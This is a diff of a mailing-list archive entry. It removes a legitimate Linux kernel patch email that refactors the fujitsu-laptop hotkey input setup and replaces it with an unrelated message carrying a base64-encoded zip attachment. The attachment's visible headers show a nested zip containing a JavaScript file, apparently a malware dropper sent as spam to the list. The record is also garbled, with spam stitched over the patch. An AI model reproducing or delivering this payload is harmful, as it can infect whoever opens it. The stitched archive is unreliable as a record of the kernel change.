@@ -1,132 +1,67 @@
-From: =?UTF-8?q?Micha=C5=82=20K=C4=99pie=C5=84?= <kernel@kempniu.pl>
-Subject: [PATCH 4/8] platform/x86: fujitsu-laptop: move hotkey input device setup to a separate function
-Date: Mon, 20 Mar 2017 10:32:20 +0100
-Message-ID: <20170320093224.18541-5-kernel@kempniu.pl>
-References: <20170320093224.18541-1-kernel@kempniu.pl>
+From: <wesley.sydnor@louisvillemsd.org>
+Subject: 21851 platform-driver-x86
+Date: Tue, 21 Mar 2017 12:24:07 -0000
+Message-ID: <149009904730.19462.5911051590857490638@tbt.ru>
+Reply-To: <wesley.sydnor@louisvillemsd.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170320093224.18541-1-kernel@kempniu.pl>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Jonathan Woithe <jwoithe@just42.net>, Darren Hart <dvhart@infradead.org>, Andy Shevchenko <andy@infradead.org>
-Cc: platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org
-List-Id: platform-driver-x86.vger.kernel.org
+Content-Type: application/zip; name="611000.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from ip9.49.52.176.kzn.tbt.ru ([176.52.49.9]:40316 "HELO tbt.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S932173AbdCUMYM (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Tue, 21 Mar 2017 08:24:12 -0400
+Content-Disposition: attachment
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86 <platform-driver-x86@vger.kernel.org>
 
-Simplify error handling in acpi_fujitsu_laptop_add() by moving code
-responsible for setting up the input device to a separate function.
-
-Signed-off-by: Michał Kępień <kernel@kempniu.pl>
----
- drivers/platform/x86/fujitsu-laptop.c | 74 ++++++++++++++++++++---------------
- 1 file changed, 43 insertions(+), 31 deletions(-)
-
-diff --git a/drivers/platform/x86/fujitsu-laptop.c b/drivers/platform/x86/fujitsu-laptop.c
-index 3483ac37bee5..b1a08d83330b 100644
---- a/drivers/platform/x86/fujitsu-laptop.c
-+++ b/drivers/platform/x86/fujitsu-laptop.c
-@@ -756,6 +756,46 @@ static void acpi_fujitsu_bl_notify(struct acpi_device *device, u32 event)
- 
- /* ACPI device for hotkey handling */
- 
-+static int acpi_fujitsu_laptop_input_setup(struct acpi_device *device)
-+{
-+	struct fujitsu_laptop *fujitsu_laptop = acpi_driver_data(device);
-+	struct input_dev *input;
-+	int error;
-+
-+	fujitsu_laptop->input = input = input_allocate_device();
-+	if (!input)
-+		return -ENOMEM;
-+
-+	snprintf(fujitsu_laptop->phys, sizeof(fujitsu_laptop->phys),
-+		 "%s/video/input0", acpi_device_hid(device));
-+
-+	input->name = acpi_device_name(device);
-+	input->phys = fujitsu_laptop->phys;
-+	input->id.bustype = BUS_HOST;
-+	input->id.product = 0x06;
-+	input->dev.parent = &device->dev;
-+
-+	set_bit(EV_KEY, input->evbit);
-+	set_bit(fujitsu_bl->keycode1, input->keybit);
-+	set_bit(fujitsu_bl->keycode2, input->keybit);
-+	set_bit(fujitsu_bl->keycode3, input->keybit);
-+	set_bit(fujitsu_bl->keycode4, input->keybit);
-+	set_bit(fujitsu_bl->keycode5, input->keybit);
-+	set_bit(KEY_TOUCHPAD_TOGGLE, input->keybit);
-+	set_bit(KEY_UNKNOWN, input->keybit);
-+
-+	error = input_register_device(input);
-+	if (error)
-+		goto err_free_input_dev;
-+
-+	return 0;
-+
-+err_free_input_dev:
-+	input_free_device(input);
-+
-+	return error;
-+}
-+
- static int fujitsu_laptop_platform_add(void)
- {
- 	int ret;
-@@ -794,7 +834,6 @@ static int acpi_fujitsu_laptop_add(struct acpi_device *device)
- {
- 	int result = 0;
- 	int state = 0;
--	struct input_dev *input;
- 	int error;
- 	int i;
- 
-@@ -816,33 +855,9 @@ static int acpi_fujitsu_laptop_add(struct acpi_device *device)
- 		goto err_stop;
- 	}
- 
--	fujitsu_laptop->input = input = input_allocate_device();
--	if (!input) {
--		error = -ENOMEM;
--		goto err_free_fifo;
--	}
--
--	snprintf(fujitsu_laptop->phys, sizeof(fujitsu_laptop->phys),
--		 "%s/video/input0", acpi_device_hid(device));
--
--	input->name = acpi_device_name(device);
--	input->phys = fujitsu_laptop->phys;
--	input->id.bustype = BUS_HOST;
--	input->id.product = 0x06;
--	input->dev.parent = &device->dev;
--
--	set_bit(EV_KEY, input->evbit);
--	set_bit(fujitsu_bl->keycode1, input->keybit);
--	set_bit(fujitsu_bl->keycode2, input->keybit);
--	set_bit(fujitsu_bl->keycode3, input->keybit);
--	set_bit(fujitsu_bl->keycode4, input->keybit);
--	set_bit(fujitsu_bl->keycode5, input->keybit);
--	set_bit(KEY_TOUCHPAD_TOGGLE, input->keybit);
--	set_bit(KEY_UNKNOWN, input->keybit);
--
--	error = input_register_device(input);
-+	error = acpi_fujitsu_laptop_input_setup(device);
- 	if (error)
--		goto err_free_input_dev;
-+		goto err_free_fifo;
- 
- 	error = acpi_bus_update_power(fujitsu_laptop->acpi_handle, &state);
- 	if (error) {
-@@ -960,10 +975,7 @@ static int acpi_fujitsu_laptop_add(struct acpi_device *device)
- 	return result;
- 
- err_unregister_input_dev:
--	input_unregister_device(input);
--	input = NULL;
--err_free_input_dev:
--	input_free_device(input);
-+	input_unregister_device(fujitsu_laptop->input);
- err_free_fifo:
- 	kfifo_free(&fujitsu_laptop->fifo);
- err_stop:
--- 
-2.12.0
+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
+BAAAAABQSwUGAAAAAAEAAQBTAAAAKQoAAAAA
